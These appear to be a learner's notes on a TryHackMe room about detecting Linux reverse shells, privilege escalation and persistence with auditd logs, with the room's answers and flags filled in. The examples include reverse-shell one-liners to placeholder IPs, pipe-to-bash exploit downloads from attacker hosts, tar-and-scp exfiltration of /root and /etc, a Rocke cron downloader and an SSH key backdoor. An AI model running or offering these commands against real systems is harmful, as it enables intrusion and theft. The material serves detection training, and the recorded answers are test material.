---
title:      "TryHackMe  - Linux Threat Detection 3"
date:       2026-02-12T00:00:00-05:00
tags:       ["learning", "notes", "tryhackme"]
identifier: "20260212T000000"
Hubs: "TryHackMe/SOC Level 1/Linux Security Monitoring"
URLs: (https://tryhackme.com/room/linuxthreatdetection3)
---

# TryHackMe | Linux Threat Detection 3

## Task 1 | Introduction

Not all Linux attacks are simple SSH brute force or cryptomining - some are carefully planned, targeted campaigns comparable to most advanced Windows breaches. In this room, you'll delve into more complex, manual Linux attack techniques commonly seen in targeted intrusions and learn how to detect them using system logs.

 Learning Objectives 
- Learn how reverse shells are used in Linux intrusions
- Understand how the attackers escalate their privileges
- Explore the five most common techniques to persist on Linux
- Uncover the learned techniques through the system logs

 Prerequisites 
- Complete the [Linux Threat Detection 2](https://tryhackme.com/room/linuxthreatdetection2) room
- Recall the second half of the [MITRE](https://tryhackme.com/room/mitre) tactics
- Be familiar with Bash and Linux administration

 Lab Access Before moving forward, start the lab by clicking the **Start Machine**  button below. The machine will start in split view and will take about two minutes to load. In case the machine is not visible, you can click the **Show Split View**  button at the top of the task. You may need to work as the root user for some tasks. To switch to root on the VM, please run `sudo su`.

 Your virtual environment has been set upAll machine details can be found at the top of the page.

![Image 1](https://tryhackme.com/static/svg/target-machine.a3955286.svg)

Target machine

![Image 2](data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTciIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNyAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTguODI1MiAwQzQuNDA2NDUgMCAwLjgyNTE5NSAzLjU4MTI1IDAuODI1MTk1IDhDMC44MjUxOTUgMTIuNDE4NyA0LjQwNjQ1IDE2IDguODI1MiAxNkMxMy4yNDM5IDE2IDE2LjgyNTIgMTIuNDE4NyAxNi44MjUyIDhDMTYuODI1MiAzLjU4MTI1IDEzLjI0MzkgMCA4LjgyNTIgMFpNOC44MjUyIDRDOS4zNzczOCA0IDkuODI1MiA0LjQ0NzgxIDkuODI1MiA1QzkuODI1MiA1LjU1MjE5IDkuMzc3MzggNiA4LjgyNTIgNkM4LjI3MzAxIDYgNy44MjUyIDUuNTUzMTIgNy44MjUyIDVDNy44MjUyIDQuNDQ2ODggOC4yNzIwNyA0IDguODI1MiA0Wk0xMC4wNzUyIDEySDcuNTc1MkM3LjE2MjcgMTIgNi44MjUyIDExLjY2NTYgNi44MjUyIDExLjI1QzYuODI1MiAxMC44MzQ0IDcuMTYxMTMgMTAuNSA3LjU3NTIgMTAuNUg4LjA3NTJWOC41SDcuODI1MkM3LjQxMTEzIDguNSA3LjA3NTIgOC4xNjQwNiA3LjA3NTIgNy43NUM3LjA3NTIgNy4zMzU5NCA3LjQxMjcgNyA3LjgyNTIgN0g4LjgyNTJDOS4yMzkyNiA3IDkuNTc1MiA3LjMzNTk0IDkuNTc1MiA3Ljc1VjEwLjVIMTAuMDc1MkMxMC40ODkzIDEwLjUgMTAuODI1MiAxMC44MzU5IDEwLjgyNTIgMTEuMjVDMTAuODI1MiAxMS42NjQxIDEwLjQ5MDggMTIgMTAuMDc1MiAxMloiIGZpbGw9IiM4NzhGQTIiLz4KPC9zdmc+Cg==)

Status:On  Credentials

 Alternatively, you can access the VM from your own VPN-connected machine with the credentials below:

   Username    ubuntu        Password    Secure!        IP address    10.49.187.176        Connection via    SSH

### **Answer the questions below**

**Question:** 

*Answer:* 

     No answer needed

---

## Task 2 | Reverse Shells

Attack Convenience Threat actors entering via SSH get a convenient terminal with colors, autocompletion, and Ctrl+C support. However, not every breach grants a fully functional terminal. When Initial Access happens via an exploit or a web vulnerability, the attackers may face limitations: Buggy command output, execution delays and timeouts, rate limits, network restrictions, and many more. In this task, you will gain access to the TryPingMe app and see how these limitations work in practice.

 *![Image 3](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1758648434107.svg)*

 Reverse Shells To combat the limitations, threat actors establish a reverse shell - a session from the victim to the attacker, a more convenient and often the only possible action to continue the attack. You can read about reverse shells in the [Shells Overview](https://tryhackme.com/room/shellsoverview) room, but let's focus on the detection part for this task. Below are three of the many methods to open a reverse shell on Linux:

    Command on the Victim Explanation   `bash -i >& /dev/tcp/10.10.10.10/1337 0>&1` The victim is forced to connect to 10.10.10.10:1337 and launch "bash" for the attacker.   `socat TCP:10.20.20.20:2525 EXEC:'bash',pty,stderr,setsid,sigint,sane` Socat alternative to the above command. The attacker is listening at 10.20.20.20:2525.   `python3 -c '[...] s.connect(("10.30.30.30",80));pty.spawn("bash")'` Python alternative to the above command. The attacker is listening at 10.30.30.30:80.    Detecting Reverse Shells SOC typically treats reverse shells as critical alerts as they indicate that the system has already been breached and a human threat actor is actively attempting to establish a shell and continue the attack. Luckily, they are detectable with auditd. Below is the log output when a socat reverse shell is established after exploiting a vulnerability in the TryPingMe application:

   Finding Reverse Shell Origin 
```Finding Reverse Shell Origin 
root@thm-vm:~$ ausearch -i -x socat # Look for suspicious commands like socat
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --pid 27806 # Find its parent process and build a process tree
type=PROCTITLE msg=audit(09/19/25 17:42:07.825:404) : proctitle=/bin/sh -c 4 -W 1 127.0.0.1 && socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:07.825:404) : ppid=27796 pid=27806 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --pid 27796 # Move up the process tree to confirm its origin - TryPingMe
type=PROCTITLE msg=audit(09/19/25 17:41:57.252:403) : proctitle=/usr/bin/python3 /opt/trypingme/main.py
type=SYSCALL msg=audit(09/19/25 17:41:57.252:403) : exe=/usr/bin/python3.12 ppid=1 pid=27796 auid=unset uid=serviceuser key=exec
```

   After the reverse shell to the attacker's IP is established, it is usually followed by Discovery and other stages you learned in the previous rooms. As always, you can list all commands originating from the spawned reverse shell by building a process tree:

   Listing Reverse Shell Activity 
```Listing Reverse Shell Activity 
root@thm-vm:~$ ausearch -i -x socat # Start from the detected reverse shell
type=PROCTITLE msg=audit(09/19/25 17:42:10.903:406) : proctitle=socat TCP:10.20.20.20:2525 EXEC:'bash',[...]
type=SYSCALL msg=audit(09/19/25 17:42:10.903:406) : ppid=27806 pid=27808 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --ppid 27808 | grep proctitle # List all its child processes
type=PROCTITLE msg=audit(09/19/25 17:42:12.825:408) : proctitle=id
type=PROCTITLE msg=audit(09/19/25 17:42:14.371:410) : proctitle=uname -a
type=PROCTITLE msg=audit(09/19/25 17:42:25.432:412) : proctitle=ls -la .
[...]
```

    In this task, use the VM to see how TryPingMe vulnerability works in practice:
 - Access TryPingMe through your browser or AttackBox at **http://10.49.187.176:8000** 
 - Access the scenario auditd logs at **ausearch -i -if /home/ubuntu/scenario/audit.log**

### **Answer the questions below**

**Question:** 

*Answer:* 

     svctrypingme

**Question:** 

*Answer:* 

     THM{revshells_practitioner!}

**Question:** 

*Answer:* 

     10.14.105.255

---

## Task 3 | Privilege Escalation

Privilege Escalation Basics Another obstacle for attackers is insufficient privileges. Initial Access doesn't always mean a full system compromise, and web attacks and exploits often start as low-privilege service users. These users can sometimes be restricted to a single folder (e.g. /var/www/html) or have no ability to download and run malware. In this case, the attackers need [Privilege Escalation](https://attack.mitre.org/tactics/TA0004/), which can be achieved through various techniques. For example, to get to the root user, the threat actors may:

    Preceding Discovery (IF) Privilege Escalation (THEN)   The `uname -a` shows an old, unpatched Ubuntu 16.04 Run an exploit like PwnKit: `wget http://bad.thm/pwnkit.sh | bash`   The `find /bin -perm 4000` detects an `env` binary with the SUID flag Use the SUID vulnerability to get root access: `/bin/env /bin/bash -p`   The `ls /etc/ssh` exposed an unprotected `ssh-backup-key` file Try using the file to get root access: `ssh root@127.0.0.1 -i ssh-backup-key`    Detecting Privilege Escalation Detecting Privilege Escalation might be tricky because of how different it can be: There are [hundreds](https://gtfobins.github.io/#+suid) of SUID misconfigurations and thousands of software vulnerabilities, each exploitable in its own unique way. Thus, a more universal approach would be to detect the surrounding events. For example, review the attack below which has just three steps: Discovery, Privilege Escalation, and Exfiltration after the "root" access is gained.

 
```
# Detection 1: A Spike of Discovery Commands
whoami                                                # Returns "www-data" user
id; pwd; ls -la; crontab -l                           # Basic initial Discovery
ps aux | egrep "edr|splunk|elastic"                   # Security tools Discovery
uname -r                                              # Returns an old 4.4 kernel

# Detection 2: A Download to Temp Directory
wget http://c2-server.thm/pwnkit.c -O /tmp/pwnkit.c   # Pwnkit exploit download
gcc /tmp/pwnkit.c -o /tmp/pwnkit                      # Pwnkit exploit compilation
chmod +x /tmp/pwnkit                                  # Making exploit executable
/tmp/pwnkit                                           # Trying to use the exploit

# Detection 3: Data Exfiltration With SCP
whoami                                                # Now returns "root" user
tar czf dump.tar.gz /root /etc/                       # Archiving sensitive data
scp dump.tar.gz attacker@c2-server.thm:~              # Exfiltrating the data
```

 Even if you don't know the exact mechanics of the [PwnKit](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034) exploit, you can still detect anomalies using more common attack indicators. After spotting suspicious activity, you can confirm whether privilege escalation succeeded by comparing the effective user before and after the exploit. If the users differ, the attacker gained elevated privileges, like in the example below:

   Looking for Reverse Shell Activity 
```Looking for Reverse Shell Activity 
root@thm-vm:~$ ausearch -i -x pwnkit # The PwnKit was launched by serviceuser (Look at the UID field)
type=PROCTITLE msg=audit(09/19/25 17:56:12.154:416) : proctitle=/tmp/pwnkit
type=SYSCALL msg=audit(09/19/25 17:56:12.154:416) : ppid=24302 pid=24304 auid=unset uid=serviceuser key=exec

root@thm-vm:~$ ausearch -i --ppid 24304 # The PwnKit spawned a root shell (Look at the UID field)
type=PROCTITLE msg=audit(09/19/25 17:56:12.807:418) : proctitle=bash
type=SYSCALL msg=audit(09/19/25 17:56:12.807:418) : ppid=24304 pid=24310 auid=unset uid=root key=exec

root@thm-vm:~$ ausearch -i --ppid 24310 # The threat actor continues the attack as root user
type=PROCTITLE msg=audit(09/19/25 17:56:15.225:424) : proctitle=whoami
type=SYSCALL msg=audit(09/19/25 17:56:15.225:424) : ppid=24310 pid=24312 auid=unset uid=root key=exec
```

Continue with the TryPingMe scenario and find out what followed the reverse shell!
You can start the hunt from **ausearch -i -if /home/ubuntu/scenario/audit.log** .

### **Answer the questions below**

**Question:** 

*Answer:* 

     grep -iR pass .

**Question:** 

*Answer:* 

     su root

**Question:** 

*Answer:* 

     nGql1pQkGa

---

## Task 4 | Startup Persistence

Persistence in Linux Standalone Linux servers can run for years without a single reboot and are often left untouched unless something breaks. Some threat actors rely on it and do not rush to establish [Persistence](https://attack.mitre.org/tactics/TA0003/). However, those aiming for long-term access often set up one or two additional backdoors. As in Windows, there are many ways threat actors persist on Linux. Let's start with the most common ones.

 Cron Persistence Cron jobs are like scheduled tasks in Windows - they are the simplest way to run a process on schedule and the most popular persistence method. For example, as a part of a big espionage campaign, **APT29** deployed a fully-functional malware named GoldMax ([CrowdStrike blogpost](https://www.crowdstrike.com/en-us/blog/observations-from-the-stellarparticle-campaign/#:~:text=a%20crontab%20entry%20was%20created%20with%20a)). To ensure the malware survives a reboot, they added a new line to the victim's cron job file, located at `/var/spool/cron/<user>`.

 
```
# A line added by APT29 to /var/spool/cron/<user> to run malware on boot
@reboot nohup /home/<user>/.<hidden-directory>/<malware-name> > /dev/null 2>&1 &
```

 Another example is **Rocke** cryptominer. After exploiting vulnerabilities in public-facing services like Redis or phpMyAdmin, Rocke downloads the cryptomining script from Pastebin and installs it as a `/etc/cron.d/root` cron job ([Red Canary blogpost](https://redcanary.com/blog/threat-detection/rocke-cryptominer/#:~:text=Rocke%20takes%20advantage%20of%20this%20to%20modify%20crontabs)). Note the `*/10` part, which means the script will be redownloaded every 10 minutes, likely to quickly restore its files in case the IT team accidentally deletes them.

 
```
# A simplified command that adds the cron job to /etc/cron.d/root
echo "*/10 * * * root (curl https://pastebin.com/raw/1NtRkBc3) | sh" > /etc/cron.d/root
```

 Systemd Persistence Systemd services host the most critical system components. Nowadays, DNS, SSH, and nearly every web service are organized as separate .service files located at `/lib/systemd/system` or `/etc/systemd/system` folders. With "root" privileges, you can make your own services, as can the threat actors. For example, the **Sandworm**  group once created a "cloud-online" service to enable its GOGETTER malware to run on reboot ([Mandiant report](https://cloud.google.com/blog/topics/threat-intelligence/sandworm-disrupts-power-ukraine-operational-technology/#:~:text=When%20leveraging%20GOGETTER%2C%20Sandworm%20utilized%20a%20Systemd%20service)).

 
```
# A simplified content of /lib/systemd/system/cloud-online.service file
[Unit]
Description=Initial cloud-online job    # Fake description to mimic a trusted service
[Service]
ExecStart=/usr/bin/cloud-online         # GOGETTER malware disguisted as a trusted file
```

 Detecting Persistence In this room, let's focus on detecting the moment attackers establish Persistence. Both cron jobs and systemd services are defined as simple text files, which means you can monitor them for changes using auditd. In addition, Persistence can be detected by tracking the creation of related processes, specifically `crontab` for managing cron jobs and `systemctl` for managing services:

    Monitor changes in cron job files `/etc/crontab`, `/etc/cron.d*`, `/var/spool/cron/*`, `/var/spool/crontab/*`   Monitor changes in systemd folders `/lib/systemd/system/*`, `/etc/systemd/system/*`, and [less common](https://manpages.ubuntu.com/manpages/questing/en/man5/systemd.unit.5.html) locations   Monitor related processes such as `nano /etc/crontab`, `crontab -e`, `systemctl start|enable <service>`      Detecting Persistence With Auditd 
```Detecting Persistence With Auditd 
root@thm-vm:~$ ausearch -i -f /etc/systemd # Look for file changes inside /etc/systemd
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=vi /etc/systemd/system/malicious.service
type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/etc/systemd/system/malicious.service
type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/
type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd

root@thm-vm:~$ ausearch -i -x crontab # Look for execution of crontab command
type=PROCTITLE msg=audit(09/22/25 17:25:14.933:807) : proctitle=crontab -e
type=SYSCALL msg=audit(09/22/25 17:25:14.933:807) : syscall=execve [...] ppid=1265 pid=1316 uid=root key=exec
```

    In this task, try to detect two persistence methods by using auditd logs (**ausearch -i** ).
Once detected, launch the persisted malware (e.g. **/bin/malware** ) and get your flag!
**Note:**  You might need to switch to root for this task by running **sudo su**

### **Answer the questions below**

**Question:** 

*Answer:* 

     THM{hidden_penguin!}

**Question:** 

*Answer:* 

     THM{ressurect_on_reboot!}

---

## Task 5 | Account Persistence

Account Persistence The previous task was mainly about making the malware survive a reboot. But what about persistent access? As an attacker, you might want to return to the victim in a month to steal more data, but don't leave any malware there. How can you maintain access without malware? It all depends on how you entered in the first place.

 New User Account If SSH is exposed, the attackers may create a new user account, add it to a privileged group, and then use it for further SSH logins. The detection is simple, too, as you can track the user creation events through authentication logs and then reconstruct the full process tree with auditd (by starting with `ausearch -i --ppid 27254` for the example below):

   Detecting New User Account 
```Detecting New User Account 
root@thm-vm:~$ cat /var/log/auth.log | grep -E 'useradd|usermod'
2025-09-18T15:46:30 thm-vm useradd[27254]: new group: name=support, GID=1001
2025-09-18T15:46:30 thm-vm useradd[27254]: new user: name=support, UID=1001, GID=1001, home=/home/support, shell=/bin/bash
2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to group 'sudo'
2025-09-18T15:46:32 thm-vm usermod[27258]: add 'support' to shadow group 'sudo'
```

   Backdoored SSH Keys Another account persistence method is to backdoor the SSH keys of one of the users and use them for future logins instead of a password. You have already encountered this in the [Linux Threat Detection 2](https://tryhackme.com/room/linuxthreatdetection2) room, where Dota3 malware added its key to the breached user. This technique is difficult for IT to spot as malicious keys can blend in with legitimate ones. For example:

   Adding SSH Backdoor 
```Adding SSH Backdoor 
# Adding SSH backdoor to the authorized_keys
root@thm-vm:~$ echo "AAAAC3Nza...IkiINvQt/R" >> ~/.ssh/authorized_keys

# It's hard to guess which key is a backdoor!
root@thm-vm:~$ cat ~/.ssh/authorized_keys
ssh-ed25519 AAAAC3Nza...oh5fpNy1Gi # Legitimate key
ssh-ed25519 AAAAC3Nza...N9a2UYsFpQ # Legitimate key
ssh-ed25519 AAAAC3Nza...IkiINvQt/R # Backdoor key
```

   By default, authorized SSH public keys are stored in each user's `~/.ssh/authorized_keys` file, so your best detection method is to monitor changes to these files using auditd. Note that relying on process creation events is ineffective, since there are numerous ways to modify SSH keys, some of which aren't properly traced with auditd. For example, `echo [key] >> ~/.ssh/authorized_keys` will not be logged, as echo is a [shell builtin](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html):

   Detecting SSH Backdoor 
```Detecting SSH Backdoor 
# Traces of a backdoor created with "echo [key] >> ~/.ssh/authorized_keys"# Note how the malicious "echo" command is logged simply as "bash"
root@thm-vm:~$ ausearch -i -f /.ssh/authorized_keys
type=PROCTITLE msg=audit(09/22/25 16:55:12.740:806) : proctitle=bash
type=PATH msg=audit(09/22/25 16:55:12.740:806) : item=1 name=/home/user/.ssh/authorized_keys
type=CWD msg=audit(09/22/25 16:55:12.740:806) : cwd=/
type=SYSCALL msg=audit(09/22/25 16:55:12.740:806) : syscall=openat [...] a2=O_WRONLY|O_CREAT|O_EXCL ppid=1265 pid=1310 uid=root exe=/usr/bin/vi key=systemd
```

   Application Persistence Imagine a WordPress website where the web admin account has been breached. With admin privileges, the attackers can add a backdoor (e.g. a [WSO web shell](https://www.wordfence.com/blog/2017/06/wso-shell/#:~:text=WSO%20is%20designed%20to%20be%20used%20via%20a%20web%20browser)) to the website and run commands through the backdoor - no cron jobs or SSH keys required! Moreover, because the persistence lives in the application layer, auditd and system logs often never see it.

 While app-level persistence is beyond the scope of this room, you should be aware that it's a possible and common scenario. If you verified all possible persistence techniques, but malware somehow reappears after some time, one of your public-facing apps might be compromised!

 ![Image 4](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1758748749763.svg)

  Now, detect two more persistence methods on the VM: Backdoored user and SSH key.
You can use auditd (**ausearch -i** ) and authentication logs to answer the questions.

### **Answer the questions below**

**Question:** 

*Answer:* 

     koichi

**Question:** 

*Answer:* 

     /root/.ssh/authorized_keys

---

## Task 6 | Targeted Attacks and Recap

Targeted Attacks In the [Linux Threat Detection 2](https://tryhackme.com/room/linuxthreatdetection2) room, you have explored "Hack and Forget" attacks, such as cryptominer infections. They are automated, do not care about who the victim is, and rarely employ tactics like Privilege Escalation. However, there can be more complex and more devastating attacks that target specific companies or governments. That's where you would need the learned techniques the most!

 ![Image 5](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1765918643670.png)

 **Linux as Entry Point**

 Linux machines are commonly deployed as firewalls, web servers, mail servers, or other public-facing services. Even in organizations where 99% of the infrastructure is Windows-based, a single compromised Linux server can open the door to a corporate network and result in a big [Impact](https://attack.mitre.org/tactics/TA0040/). That's why, as a SOC analyst, you need to know how to secure all popular operating systems!

 ![Image 6](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1758756245650.svg)

 **Linux in Espionage**

 Linux machines can store sensitive information or be used in mission-critical networks and thus are often targeted by state-sponsored threat groups. For example, in this espionage campaign ([Symantec article](https://www.security.com/threat-intelligence/springtail-kimsuky-backdoor-espionage)), Kimsuky APT installed a backdoor on multiple important Linux targets. Interestingly, they used systemd service persistence - the technique you already know.

 ![Image 7](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1758756245665.svg)

 **Linux in Ransomware**

 Linux ransomware is [on the rise](https://invenioit.com/security/linux-ransomware-attacks-rise/?srsltid=AfmBOoqCQp_0W_lZxIKX9OoiEmXNjK9ZEXx6S91fwY5bVre1o099D3wp#:~:text=EDR%20in%20Action%20%E2%86%92-,Does%20Ransomware%20Affect%20Linux%3F,-Yes%2C%20ransomware%20can), with hypervisors becoming a prime target. Imagine the case: Your company runs hundreds of Windows VMs, all sitting on just three Linux physical servers (hypervisors). If those hypervisors aren't properly secured, all corporate VMs are at risk. For a real-world example of how attackers breach hypervisors, check out the [Varonis article](https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire#ransomware-payload).

 ![Image 8](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1758758482985.svg)

 Threat Detection Recap After completing the Linux Threat Detection rooms, you should understand that Linux systems can be complex, but also critical assets to protect. Fortunately, now you can identify the risks and spot the most common techniques across the MITRE ATT&CK matrix. Here is a quick recap of what you learned so far (highlighted in yellow):

 ![Image 9](https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1758756246253.png)

### **Answer the questions below**

**Question:** 

*Answer:* 

     Yea

**Question:** 

*Answer:* 

     Yea

---

## Task 7 | Conclusion

Throughout a series of scenarios and real-world examples, you explored more complex, targeted Linux attacks: How adversaries overcome access constraints, how they maintain long-term persistence, and what goals they pursue.

 Many SOC teams skip Linux monitoring, but now you know why it's a dangerous blind spot and are prepared to detect complete attack chains in SIEM or directly on the host. We hope the auditd practice wasn't too painful, and that you enjoyed the Linux Threat Detection journey!

### **Answer the questions below**

**Question:** 

*Answer:* 

     No answer needed

---

